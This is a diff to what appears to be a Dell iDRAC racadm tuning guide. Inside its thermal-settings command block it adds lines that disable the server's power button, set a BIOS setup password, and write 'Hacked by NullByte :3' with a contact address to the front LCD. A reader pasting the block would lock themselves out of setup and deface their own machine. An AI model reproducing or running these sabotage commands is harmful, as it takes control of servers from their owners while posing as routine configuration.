@@ -17,6 +17,15 @@ racadm set System.ThermalSettings.FanSpeedOffset 1
 racadm set cfgThermalEnhancedCoolingMode 1
 racadm set System.ThermalSettings.AirTemperatureRiseLimit 255
 racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
+racadm set BIOS.SysSecurity.PwrButton Disabled
+racadm set BIOS.SysSecurity.SetupPassword YourSecurePassword 
+racadm set System.LCD.Configuration 0
+racadm set System.LCD.UserDefinedString "Hacked by NullByte :3     Contact: me@nullbyte.rip" 
+```
+
+## Update
+```bash
+racadm fwupdate -g -u -a x.x.x.x -d ftp/updates/firmimg.d7
 ```
 
 ## Table of Contents
